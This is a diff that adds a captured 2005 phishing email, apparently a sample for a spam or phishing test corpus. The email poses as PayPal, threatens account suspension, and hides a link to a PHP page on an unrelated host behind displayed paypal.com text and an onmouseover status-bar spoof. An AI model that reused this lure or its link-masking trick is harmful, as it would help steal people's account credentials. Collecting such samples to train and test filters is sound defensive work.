@@ -1,0 +1,113 @@
+From nobody Sun Jan 25 13:49:56 2015
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id E054B2A88C
+ for <user@example.com>; Sun,  9 Oct 2005 10:03:59 -0400 (EDT)
+Received: by mail.example.com (Example mail relay)
+ id D9A4F621C89; Sun,  9 Oct 2005 10:03:59 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+ by mail.example.com (Example mail relay) with ESMTP id 9F747621C66
+ for <user@example.com>; Sun,  9 Oct 2005 10:03:59 -0400 (EDT)
+Received: (from user@localhost) by mail.example.com id KAA29466
+ for user@example.com; Sun, 9 Oct 2005 10:03:59 -0400
+Received: from sl30.internetworks.com.mx (sl30.internetworks.com.mx
+ [216.29.152.23]) by mail.example.com with ESMTP id KAA29458
+ for <user@example.com>; Sun, 9 Oct 2005 10:03:58 -0400
+Received: from nobody by sl30.internetworks.com.mx with local (Exim 4.52)
+ id 1EObmQ-0001WP-8b
+ for user@example.com; Sun, 09 Oct 2005 09:03:58 -0500
+To: user@example.com
+Subject: Your Paypal Account.
+From: Paypal <service@paypal.com>
+Reply-To: service@paypal.com
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1EObmQ-0001WP-8b@sl30.internetworks.com.mx>
+Date: Sun, 09 Oct 2005 09:03:58 -0500
+X-AntiAbuse: This header was added to track abuse,
+ please include it with any abuse report
+X-AntiAbuse: Primary Hostname - sl30.internetworks.com.mx
+X-AntiAbuse: Original Domain - example.com
+X-AntiAbuse: Originator/Caller UID/GID - [99 32003] / [47 12]
+X-AntiAbuse: Sender Address Domain - sl30.internetworks.com.mx
+X-Source-Args: /usr/local/apache/bin/httpd -DSSL 
+X-Source-Dir: y2ksecurity.com:/public_html/prospero/PHPBulkEmailer/mailer
+Content-Length: 3401
+Lines: 69
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 188
+
+<html dir="ltr">
+
+<head>
+<meta name="GENERATOR" content="Microsoft FrontPage 5.0">
+<meta name="ProgId" content="FrontPage.Editor.Document">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>paypal update account</title>
+<table class="applicationcontainer managementview" cellSpacing="0" cellPadding="0" width="100%" border="0" dir="ltr">
+  <tr vAlign="top" dir="ltr">
+    <td class="content" dir="ltr">
+    <div id="message" dir="ltr">
+      <p dir="ltr">
+      <a href="http://www.paypal.com/cgi-bin/webscr?cmd=_home" target="_blank">
+      <img src="http://static.paypal.com/en_US/i/logo/paypal_logo.gif" border="0" width="200" height="50"></a>
+      </p>
+      <table cellSpacing="0" cellPadding="0" width="600" align="center" border="0" dir="ltr">
+        <tr>
+          <td colSpan="3" dir="ltr">
+          <p dir="ltr">
+          <img height="2" src="http://mail.yahoo.com/config/login?/pp.files/pixel.gif" width="2"></td>
+        </tr>
+      </table>
+      <p dir="ltr"><font size="2"><font face="Verdana">Dear valued <strong>
+      <span style="FONT-SIZE: 10pt; COLOR: black; FONT-FAMILY: Verdana">PayPal<sup>®</sup></span>
+      </strong>member</font>: </font></p>
+      <p dir="ltr"><font face="Verdana" size="2">It has come to our attention 
+      that your
+      <span style="FONT-SIZE: 10pt; COLOR: black; FONT-FAMILY: Verdana"><strong>
+      PayPal<sup>®</sup></strong></span> account information needs to be <br>
+      updated as part of our continuing commitment to protect your account and 
+      to <br>
+      reduce the instance of fraud on our website. If you could please take 5-10 
+      minutes <br>
+      out of your online experience and update your personal records you will 
+      not run into <br>
+      any future problems with the online service. <br>
+ </p>
+      <p dir="ltr">However, failure to update your records will result in 
+      account suspension. <br>
+      Please update your records.<br>
+      <br>
+      Once you have updated your account records, your
+      <span style="FONT-SIZE: 10pt; COLOR: black; FONT-FAMILY: Verdana"><strong>
+      PayPal<sup>®</sup></strong></span> session will not be <br>
+      interrupted and will continue as normal. Go to the link below.<br>
+      <a onmouseover="window.status='https://www.paypal.com/cgi-bin/webscr?cmd=_login-run';  return true;" href="http://www.plugx.com.br/~pedro/public_html/admins/.paypal/index.php" target="_blank" >
+      http://www.paypal.com/cgi-bin/webscr?cmd=_login-run</a></p>
+      <p dir="ltr">Thank You. <br>
+      <span style="FONT-SIZE: 10pt; COLOR: black; FONT-FAMILY: Verdana"><strong>
+      PayPal<sup>® </sup>Security Center .</strong></span> </p>
+      </font><font face="Verdana" size="1">
+      <p dir="ltr">Accounts Management As outlined in our User Agreement, </font>
+      <font face="Verdana" size="1">
+      <span style="COLOR: black; FONT-FAMILY: Verdana"><strong>
+      PayPal®</strong></span> will <br>
+      periodically send you information about site changes and enhancements. </p>
+      <p dir="ltr">Visit our Privacy Policy and User Agreement if you have any 
+      questions.
+      <br>
+      <a href="http://www.paypal.com/cgi-bin/webscr?cmd=p/gen/ua/policy_privacy-outside" target="_blank">
+      http://www.paypal.com/cgi-bin/webscr?cmd=p/gen/ua/policy_privacy-outside</a></font></div>
+    </td>
+  </tr>
+</table>
+
+</body>
+</html>
+
+
